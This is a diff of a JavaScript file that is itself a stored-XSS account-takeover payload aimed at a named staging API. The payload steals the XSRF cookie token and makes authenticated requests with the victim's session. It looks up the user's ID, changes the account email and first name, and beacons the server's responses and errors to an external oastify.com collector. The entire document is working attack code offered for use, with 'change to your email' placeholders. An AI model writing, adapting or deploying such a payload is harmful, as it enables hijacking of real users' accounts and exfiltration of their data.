@@ -1,53 +1,75 @@
-// a.js - Complete Stored XSS Account Takeover Payload
+// a.js - Updated Account Takeover Payload (Based on Real API)
 
 (function() {
-    // 1. CONFIGURATION
-    const TARGET_API = 'https://basilstagingapi.coraltreetech.com/api/user/update';
-    const ATTACKER_SERVER = 'https://sa6gpti0t3wpbikbvuvwuxi0zr5it8hx.oastify.com/log'; // Replace with your VPS/ngrok URL
+    const API_BASE = 'https://basilstagingapi.coraltreetech.com';
+    const ATTACKER_SERVER = 'https://sa6gpti0t3wpbikbvuvwuxi0zr5it8hx.oastify.com/log';
 
-    // 2. STEAL THE CSRF TOKEN FROM COOKIES
+    // 1. STEAL CSRF TOKEN (Check both formats)
     function getCookie(name) {
         const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
         return match ? decodeURIComponent(match[2]) : null;
     }
 
-    const xsrfToken = getCookie('Secure-XSRF_TOKEN');
+    // Try both possible cookie names (with and without double underscore)
+    let xsrfToken = getCookie('__Secure-XSRF_TOKEN');
+    if (!xsrfToken) xsrfToken = getCookie('Secure-XSRF_TOKEN');
+    if (!xsrfToken) xsrfToken = getCookie('XSRF-TOKEN');
 
     if (!xsrfToken) {
-        // If no CSRF token, send a warning back to yourself
-        navigator.sendBeacon(ATTACKER_SERVER, 'XSRF Token NOT found!');
+        navigator.sendBeacon(ATTACKER_SERVER, 'ERROR: XSRF token not found');
         return;
     }
 
-    // 3. SEND THE MALICIOUS REQUEST (CHANGE EMAIL)
-    fetch(TARGET_API, {
-        method: 'POST',
-        credentials: 'include', // CRITICAL: Sends HttpOnly session_token
+    // 2. FIRST: Get the current user's UUID
+    fetch(API_BASE + '/api/v1/users/me', {
+        method: 'GET',
+        credentials: 'include',
         headers: {
-            'Content-Type': 'application/json',
-            'X-XSRF-TOKEN': xsrfToken,   // Bypass CSRF protection
-            'X-Requested-With': 'XMLHttpRequest' // Sometimes required by backend
-        },
-        body: JSON.stringify({ 
-            email: 'harshit.j+regular1@cywarden.com' // Change this to your email
-        })
+            'X-Xsrf-Token': xsrfToken  // Exact casing from your screenshot
+        }
     })
     .then(response => {
-        // 4. EXFILTRATE THE RESULT BACK TO YOU
+        if (!response.ok) throw new Error('Failed to fetch user profile');
+        return response.json();
+    })
+    .then(userData => {
+        // Find the user ID (adjust based on actual response structure)
+        const userId = userData.id || userData.user?.id || userData.data?.id;
+        
+        if (!userId) {
+            throw new Error('User ID not found in response: ' + JSON.stringify(userData));
+        }
+
+        // 3. SECOND: Update the user profile (change email and first name)
+        return fetch(API_BASE + '/api/v1/users/' + userId, {
+            method: 'PUT',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Xsrf-Token': xsrfToken  // Exact casing
+            },
+            body: JSON.stringify({
+                user: {
+                    first_name: 'Hacked',
+                    email: 'harshit.j+regular1@cywarden.com'  // Change to your email
+                    // You can also add: last_name, phone, etc.
+                }
+            })
+        });
+    })
+    .then(response => {
+        // 4. EXFILTRATE THE RESULT
         return response.text().then(text => {
             const data = {
                 status: response.status,
                 statusText: response.statusText,
-                body: text,
-                url: window.location.href
+                body: text
             };
-            // Send the response to your attacker server
             navigator.sendBeacon(ATTACKER_SERVER, JSON.stringify(data));
         });
     })
     .catch(error => {
-        // If the fetch fails (CORS error, network error), log it
-        navigator.sendBeacon(ATTACKER_SERVER, 'Fetch Error: ' + error.message);
+        navigator.sendBeacon(ATTACKER_SERVER, 'ERROR: ' + error.message);
     });
 
 })();
